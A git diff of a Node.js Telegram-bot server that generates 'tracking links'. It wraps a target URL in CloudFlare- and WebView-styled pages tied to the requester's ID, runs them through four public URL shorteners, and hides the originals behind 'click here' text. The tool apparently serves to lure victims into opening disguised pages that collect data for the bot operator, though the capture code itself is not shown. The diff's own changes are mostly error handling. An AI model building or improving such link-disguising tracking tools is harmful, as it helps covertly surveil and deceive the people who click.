@@ -20,7 +20,6 @@ app.use(cors());
 // Global variables
 const bot = new TelegramBot(process.env.bot);
 const hostURL = "https://sg-modder-offcial.vercel.app"; // Updated to Replit URL
-const use1pt = false;
 
 // Get the template paths
 const viewsPath = path.join(process.cwd(), 'views');
@@ -60,10 +59,14 @@ async function shortenUrl_xcut(url) {
       body: JSON.stringify({ url }),
     });
     
+    if (!response.ok) {
+      return null;
+    }
+    
     const data = await response.json();
     
-    if (!response.ok) {
-      throw new Error(data.error || 'Failed to shorten URL');
+    if (!data.shortUrl) {
+      return null;
     }
     
     return data.shortUrl;
@@ -78,9 +81,12 @@ async function shortenUrl_tinyurl(url) {
   try {
     const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
     if (!response.ok) {
-      throw new Error('Failed to shorten URL');
+      return null;
     }
     const shortUrl = await response.text();
+    if (!shortUrl || shortUrl.includes('Error') || shortUrl.length < 10) {
+      return null;
+    }
     return shortUrl;
   } catch (error) {
     console.error('Error shortening URL with TinyURL:', error);
@@ -93,9 +99,12 @@ async function shortenUrl_isgd(url) {
   try {
     const response = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
     if (!response.ok) {
-      throw new Error('Failed to shorten URL');
+      return null;
     }
     const data = await response.json();
+    if (!data.shorturl) {
+      return null;
+    }
     return data.shorturl;
   } catch (error) {
     console.error('Error shortening URL with is.gd:', error);
@@ -108,9 +117,12 @@ async function shortenUrl_vgd(url) {
   try {
     const response = await fetch(`https://v.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
     if (!response.ok) {
-      throw new Error('Failed to shorten URL');
+      return null;
     }
     const data = await response.json();
+    if (!data.shorturl) {
+      return null;
+    }
     return data.shorturl;
   } catch (error) {
     console.error('Error shortening URL with v.gd:', error);
@@ -137,47 +149,60 @@ async function createLink(cid, msg) {
     
     try {
       // Create shortened URLs using all 4 shorteners
-      const shortUrlResults = {
-        cloudflare: {
-          original: cUrl,
-          xcut: await shortenUrl_xcut(cUrl) || "Failed to shorten",
-          tinyurl: await shortenUrl_tinyurl(cUrl) || "Failed to shorten",
-          isgd: await shortenUrl_isgd(cUrl) || "Failed to shorten",
-          vgd: await shortenUrl_vgd(cUrl) || "Failed to shorten"
-        },
-        webview: {
-          original: wUrl,
-          xcut: await shortenUrl_xcut(wUrl) || "Failed to shorten",
-          tinyurl: await shortenUrl_tinyurl(wUrl) || "Failed to shorten",
-          isgd: await shortenUrl_isgd(wUrl) || "Failed to shorten",
-          vgd: await shortenUrl_vgd(wUrl) || "Failed to shorten"
-        }
-      };
+      const cloudflareShortUrls = [];
+      const webviewShortUrls = [];
+      
+      // CloudFlare shortcuts
+      const xcutCloudflare = await shortenUrl_xcut(cUrl);
+      const tinyurlCloudflare = await shortenUrl_tinyurl(cUrl);
+      const isgdCloudflare = await shortenUrl_isgd(cUrl);
+      const vgdCloudflare = await shortenUrl_vgd(cUrl);
+      
+      // WebView shortcuts
+      const xcutWebview = await shortenUrl_xcut(wUrl);
+      const tinyurlWebview = await shortenUrl_tinyurl(wUrl);
+      const isgdWebview = await shortenUrl_isgd(wUrl);
+      const vgdWebview = await shortenUrl_vgd(wUrl);
+      
+      // Only add working shorteners to the arrays
+      if (xcutCloudflare) cloudflareShortUrls.push(xcutCloudflare);
+      if (tinyurlCloudflare) cloudflareShortUrls.push(tinyurlCloudflare);
+      if (isgdCloudflare) cloudflareShortUrls.push(isgdCloudflare);
+      if (vgdCloudflare) cloudflareShortUrls.push(vgdCloudflare);
+      
+      if (xcutWebview) webviewShortUrls.push(xcutWebview);
+      if (tinyurlWebview) webviewShortUrls.push(tinyurlWebview);
+      if (isgdWebview) webviewShortUrls.push(isgdWebview);
+      if (vgdWebview) webviewShortUrls.push(vgdWebview);
 
       // Prepare message with all shortened URLs
-      let message = `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n`;
+      let message = `New links has been created successfully.\nURL: ${msg}\n\n✅Your Tracking Links\n\n`;
       
       // CloudFlare links
-      message += `🌐 CloudFlare Page Link\n`;
-      message += `Original: ${cUrl}\n`;
-      message += `Shortened (xcut): ${shortUrlResults.cloudflare.xcut}\n`;
-      message += `Shortened (TinyURL): ${shortUrlResults.cloudflare.tinyurl}\n`;
-      message += `Shortened (is.gd): ${shortUrlResults.cloudflare.isgd}\n`;
-      message += `Shortened (v.gd): ${shortUrlResults.cloudflare.vgd}\n\n`;
+      message += `🌐 CloudFlare Page Link\n\n`;
+      message += `Original url: [click here](${cUrl})\n`;
+      
+      // Add only working CloudFlare shorteners
+      if (cloudflareShortUrls.length > 0) {
+        message += cloudflareShortUrls.join('\n') + '\n\n';
+      } else {
+        message += '\n'; // Add line break if no shorteners worked
+      }
       
       // WebView links
-      message += `🌐 WebView Page Link\n`;
-      message += `Original: ${wUrl}\n`;
-      message += `Shortened (xcut): ${shortUrlResults.webview.xcut}\n`;
-      message += `Shortened (TinyURL): ${shortUrlResults.webview.tinyurl}\n`;
-      message += `Shortened (is.gd): ${shortUrlResults.webview.isgd}\n`;
-      message += `Shortened (v.gd): ${shortUrlResults.webview.vgd}`;
+      message += `🌐 WebView Page Link\n\n`;
+      message += `Original url: [click here](${wUrl})\n`;
+      
+      // Add only working WebView shorteners
+      if (webviewShortUrls.length > 0) {
+        message += webviewShortUrls.join('\n');
+      }
       
       await bot.sendMessage(cid, message, m);
     } catch (error) {
       console.error("Error shortening URLs:", error);
       // If URL shorteners fail, send direct links
-      await bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
+      await bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Tracking Links\n\n🌐 CloudFlare Page Link\n\nOriginal url: [click here](${cUrl})\n\n🌐 WebView Page Link\n\nOriginal url: [click here](${wUrl})`, m);
     }
     
     return true;
@@ -297,8 +322,7 @@ app.get("/w/:uid/:uri", async (req, res) => {
       time: time,
       url: atob(uri),
       uid: uid,
-      a: hostURL,
-      t: use1pt
+      a: hostURL
     });
     
     res.setHeader('Content-Type', 'text/html');
@@ -328,8 +352,7 @@ app.get("/c/:uid/:uri", async (req, res) => {
       time: time,
       url: atob(uri),
       uid: uid,
-      a: hostURL,
-      t: use1pt
+      a: hostURL
     });
     
     res.setHeader('Content-Type', 'text/html');
